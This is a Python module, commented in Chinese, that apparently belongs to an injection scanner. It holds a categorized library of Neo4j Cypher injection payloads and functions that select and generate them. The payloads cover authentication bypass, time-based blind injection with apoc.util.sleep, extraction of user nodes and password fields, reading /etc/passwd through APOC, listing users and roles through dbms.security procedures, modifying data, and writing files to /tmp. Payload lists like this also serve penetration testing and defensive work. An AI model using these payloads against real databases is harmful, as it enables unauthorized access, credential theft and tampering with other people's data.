"""
Neo4j Cypher注入載荷模塊
包含針對Neo4j資料庫的Cypher查詢注入載荷，按類別組織
"""

import random

# Neo4j Cypher注入載荷集合
NEO4J_PAYLOADS = [
    # 基礎通用載荷（字符串閉合與注入）
    {"name": "單引號閉合-OR", "value": "' OR 1=1 OR '", "category": "basic"},
    {"name": "雙引號閉合-OR", "value": "\" OR 1=1 OR \"", "category": "basic"},
    {"name": "引號閉合-WITH-RETURN", "value": "' RETURN 1 as result// ", "category": "basic"},
    {"name": "引號閉合-註釋", "value": "' // ", "category": "basic"},
    {"name": "引號閉合-多行註釋", "value": "' /* ", "category": "basic"},
    {"name": "引號閉合-換行", "value": "'\n OR 1=1 OR '\n", "category": "basic"},
    {"name": "引號閉合-分號", "value": "'; RETURN 1 as result// ", "category": "basic"},
    {"name": "引號閉合-RETURN", "value": "' RETURN * // ", "category": "basic"},
    
    # 認證繞過尝试
    {"name": "OR-永真條件", "value": "' OR true OR '", "category": "auth"},
    {"name": "OR-字元串比较", "value": "' OR '' = '' OR '", "category": "auth"},
    {"name": "OR-常見用戶名", "value": "' OR username = 'admin' OR '", "category": "auth"},
    {"name": "OR-正則任意用戶名", "value": "' OR username =~ '.*' OR '", "category": "auth"},
    {"name": "OR-admin用戶名", "value": "' OR username = 'admin' OR password = '", "category": "auth"},
    {"name": "OR-用戶名為空", "value": "' OR username IS NULL OR '", "category": "auth"},
    {"name": "MATCH-所有節點", "value": "' MATCH (n) RETURN n LIMIT 1 // ", "category": "auth"},
    {"name": "MATCH-所有用戶", "value": "' MATCH (u:User) RETURN u LIMIT 1 // ", "category": "auth"},
    {"name": "WITH-傳遞假條件", "value": "' WITH 1 as one WHERE one=1 RETURN true as result // ", "category": "auth"},
    
    # 盲注試探
    {"name": "盲注-休眠", "value": "' WITH 1 as one WHERE one=1 WITH apoc.util.sleep(2000) as delay RETURN delay // ", "category": "blind"},
    {"name": "盲注-計算耗時", "value": "' WITH range(1,10000) as r UNWIND r as x WITH sum(x) as n RETURN n // ", "category": "blind"},
    {"name": "盲注-條件休眠", "value": "' WITH 1 as one WHERE one=1 WITH (CASE WHEN true THEN apoc.util.sleep(2000) ELSE 0 END) as delay RETURN delay // ", "category": "blind"},
    {"name": "盲注-多級計算", "value": "' WITH range(1,100) as r UNWIND r as x WITH collect(x) as c1 UNWIND c1 as y WITH collect(y) as c2 RETURN size(c2) // ", "category": "blind"},
    {"name": "盲注-多重條件", "value": "' WITH 1 as one WHERE one=1 WITH (CASE WHEN exists((MATCH (n) RETURN n LIMIT 1)) THEN apoc.util.sleep(2000) ELSE 0 END) as delay RETURN delay // ", "category": "blind"},
    
    # 資料提取
    {"name": "提取-節點數量", "value": "' MATCH (n) RETURN count(n) // ", "category": "extraction"},
    {"name": "提取-節點標籤", "value": "' MATCH (n) RETURN DISTINCT labels(n) // ", "category": "extraction"},
    {"name": "提取-屬性名稱", "value": "' CALL db.propertyKeys() // ", "category": "extraction"},
    {"name": "提取-關係類型", "value": "' CALL db.relationshipTypes() // ", "category": "extraction"},
    {"name": "提取-用戶節點", "value": "' MATCH (n:User) RETURN n LIMIT 5 // ", "category": "extraction"},
    {"name": "提取-資料節點", "value": "' MATCH (n) RETURN ID(n), n LIMIT 5 // ", "category": "extraction"},
    {"name": "提取-節點計數", "value": "' MATCH (n) WITH count(n) as total RETURN total // ", "category": "extraction"},
    {"name": "提取-節點指定屬性", "value": "' MATCH (n) RETURN n.username, n.password LIMIT 5 // ", "category": "extraction"},
    {"name": "提取-資料庫版本", "value": "' RETURN gds.version() // ", "category": "extraction"},
    
    # 資料庫操作
    {"name": "操作-創建節點", "value": "' CREATE (:Test{value:'test'}) RETURN 1 as created // ", "category": "operations"},
    {"name": "操作-設置屬性", "value": "' MATCH (n) SET n.test = 'test' RETURN COUNT(n) LIMIT 1 // ", "category": "operations"},
    {"name": "操作-刪除屬性", "value": "' MATCH (n) REMOVE n.test RETURN COUNT(n) LIMIT 1 // ", "category": "operations"},
    {"name": "操作-創建關係", "value": "' MATCH (a), (b) WITH a,b LIMIT 1 CREATE (a)-[:TEST]->(b) RETURN 1 // ", "category": "operations"},
    
    # APOC函數組件
    {"name": "APOC-導入JSON", "value": "' WITH apoc.convert.fromJsonMap('{\"test\":true}') as data RETURN data // ", "category": "apoc"},
    {"name": "APOC-檢查URI", "value": "' CALL apoc.util.validate(NOT apoc.net.validateUrlOrIp('http://localhost:7474'), 'Invalid URL', [0]) // ", "category": "apoc"},
    {"name": "APOC-URL請求", "value": "' CALL apoc.load.jsonParams('http://localhost:7474', {}, null) // ", "category": "apoc"},
    {"name": "APOC-函數檢測", "value": "' RETURN apoc LIMIT 1 // ", "category": "apoc"},
    {"name": "APOC-文件操作", "value": "' CALL apoc.load.json('file:///etc/passwd') // ", "category": "apoc"},
    
    # Neo4j錯誤觸發
    {"name": "錯誤-語法錯誤", "value": "' RETURN syntax_error // ", "category": "error"},
    {"name": "錯誤-未定義函數", "value": "' RETURN undefined_function() // ", "category": "error"},
    {"name": "錯誤-索引錯誤", "value": "' MATCH (n) RETURN n[0] // ", "category": "error"},
    {"name": "錯誤-類型錯誤", "value": "' RETURN 1 + 'string' // ", "category": "error"},
    {"name": "錯誤-缺少參數", "value": "' RETURN substring('test') // ", "category": "error"},
    
    # 繞過技術
    {"name": "繞過-使用WITH", "value": "' WITH 1 as one MATCH (n) WHERE one=1 RETURN n LIMIT 1 // ", "category": "bypass"},
    {"name": "繞過-使用UNION", "value": "' UNION MATCH (n) RETURN n LIMIT 1 // ", "category": "bypass"},
    {"name": "繞過-多重語句", "value": "'; MATCH (n) RETURN COUNT(n) // ", "category": "bypass"},
    {"name": "繞過-注釋混淆", "value": "' OR /*comment*/ 1=1 OR '", "category": "bypass"},
    {"name": "繞過-Unicode字符", "value": "' OR \u0074\u0072\u0075\u0065 OR '", "category": "bypass"},
    {"name": "繞過-換行符", "value": "'\n OR true\n OR\n'", "category": "bypass"},
    
    # Neo4j特定函數
    {"name": "函數-字符串函數", "value": "' OR LENGTH('test')=4 OR '", "category": "functions"},
    {"name": "函數-數學函數", "value": "' OR ABS(-1)=1 OR '", "category": "functions"},
    {"name": "函數-邏輯函數", "value": "' OR NOT false OR '", "category": "functions"},
    {"name": "函數-聚合函數", "value": "' WITH [1,2,3] as list RETURN AVG(list) // ", "category": "functions"},
    {"name": "函數-日期時間", "value": "' RETURN datetime() // ", "category": "functions"},
    {"name": "函數-空間函數", "value": "' RETURN point({x: 1, y: 2}) // ", "category": "functions"},
    
    # 常見值測試
    {"name": "值-數字", "value": "123", "category": "values"},
    {"name": "值-布爾值", "value": "true", "category": "values"},
    {"name": "值-空字符串", "value": "", "category": "values"},
    {"name": "值-admin", "value": "admin", "category": "values"},
    {"name": "值-Neo4j", "value": "neo4j", "category": "values"},
    {"name": "值-密碼", "value": "password", "category": "values"},
    {"name": "值-SQL注入嘗試", "value": "' OR 1=1 --", "category": "values"},
    
    # 自定义过程调用
    {"name": "過程-系統信息", "value": "' CALL dbms.components() // ", "category": "procedures"},
    {"name": "過程-系統存取", "value": "' CALL dbms.listConfig() // ", "category": "procedures"},
    {"name": "過程-用戶管理", "value": "' CALL dbms.security.listUsers() // ", "category": "procedures"},
    {"name": "過程-角色管理", "value": "' CALL dbms.security.listRoles() // ", "category": "procedures"},
    {"name": "過程-權限管理", "value": "' CALL dbms.security.showPrivileges() // ", "category": "procedures"},
    {"name": "過程-數據庫列表", "value": "' CALL dbms.databases() // ", "category": "procedures"},
    {"name": "過程-內存狀態", "value": "' CALL dbms.listQueries() // ", "category": "procedures"},
    
    # 特定欄位攻擊
    {"name": "欄位-特殊情況用戶名", "value": "admin' -- ", "category": "field-specific"},
    {"name": "欄位-特殊情況密碼", "value": "' OR 1=1 WITH 1 as one WHERE 1=1 -- ", "category": "field-specific"},
    {"name": "欄位-嵌入子查詢", "value": "' + MATCH (n) RETURN COUNT(n) + '", "category": "field-specific"},
    {"name": "欄位-UNION語法", "value": "' UNION MATCH (n) RETURN n.username as username, n.password as password -- ", "category": "field-specific"},
    
    # 命令執行嘗試
    {"name": "RCE-嘗試1", "value": "' CALL dbms.killQueries(['query-id']) // ", "category": "rce"},
    {"name": "RCE-嘗試2", "value": "' CALL apoc.load.jdbc('jdbc:mysql://localhost/mysql','SELECT 1') // ", "category": "rce"},
    {"name": "RCE-嘗試3", "value": "' CALL apoc.export.csv.query('MATCH (n) RETURN n','/tmp/export.csv',{}) // ", "category": "rce"},
]

def get_all_categories():
    """獲取所有可用的payload類別"""
    categories = set()
    for payload in NEO4J_PAYLOADS:
        categories.add(payload.get("category", "unknown"))
    return sorted(list(categories))

def get_payloads_by_category(category):
    """獲取指定類別的所有payload"""
    return [p for p in NEO4J_PAYLOADS if p.get("category", "unknown") == category]

def get_recommended_payloads():
    """獲取推薦的payload列表"""
    recommended_categories = ["basic", "auth", "bypass", "extraction", "field-specific"]
    recommended = []
    
    # 從推薦類別中每個選擇一些關鍵payload
    for category in recommended_categories:
        category_payloads = get_payloads_by_category(category)
        # 從每個類別中選最多3個
        selected = category_payloads[:min(3, len(category_payloads))]
        recommended.extend(selected)
    
    # 添加一些常見的測試值
    recommended.extend([p for p in NEO4J_PAYLOADS if p["name"] in [
        "值-admin", "值-Neo4j", "值-空字符串"
    ]])
    
    return recommended

def get_auth_bypass_payloads():
    """獲取認證繞過payload列表"""
    auth_payloads = get_payloads_by_category("auth")
    bypass_payloads = get_payloads_by_category("bypass")
    # 結合兩者並排除太複雜的查詢
    combined = auth_payloads + [p for p in bypass_payloads if len(p["value"]) < 50]
    return combined

def generate_field_specific_payloads(field_name="username"):
    """為特定字段生成針對性payload"""
    specific_payloads = []
    
    # 從基本payload中生成字段特定的payload
    base_payloads = get_payloads_by_category("basic") + get_payloads_by_category("auth")
    for payload in base_payloads[:5]:  # 取前5個基本payload
        specific_payloads.append({
            "name": f"{field_name}-{payload['name']}",
            "value": payload['value'],
            "category": "field-specific",
            "target_field": field_name
        })
    
    # 添加一些特定字段的專用payload
    if field_name.lower() in ["username", "user", "name", "login"]:
        specific_payloads.append({
            "name": f"{field_name}-管理員匹配",
            "value": "' MATCH (u:User) WHERE u.username =~ '(?i)admin.*' RETURN u // ",
            "category": "field-specific",
            "target_field": field_name
        })
    elif field_name.lower() in ["password", "pass", "pwd"]:
        specific_payloads.append({
            "name": f"{field_name}-密碼繞過",
            "value": "' OR length(n.password)>0 OR '",
            "category": "field-specific",
            "target_field": field_name
        })
    
    return specific_payloads

def get_timed_payload(base_payload="", delay_ms=2000):
    """生成基於時間的盲注payload"""
    # 從基本payload中提取有用部分
    if "'" in base_payload and "//" in base_payload:
        # 提取引號之間的內容
        payload_content = base_payload.split("'")[1]
        return f"' WITH 1 as one WHERE one=1 WITH apoc.util.sleep({delay_ms}) as delay{payload_content} // "
    else:
        return f"' WITH 1 as one WHERE one=1 WITH apoc.util.sleep({delay_ms}) as delay RETURN true // "

def generate_custom_cypher_query(template, **kwargs):
    """根據模板生成自定義Cypher查詢語句"""
    templates = {
        "auth_bypass": "' {match_clause} WHERE {condition} RETURN {return_clause} // ",
        "data_extract": "' MATCH {pattern} RETURN {return_clause} // ",
        "modify_data": "' MATCH {pattern} SET {set_clause} RETURN {return_clause} // "
    }
    
    if template in templates:
        return templates[template].format(**kwargs)
    else:
        return None 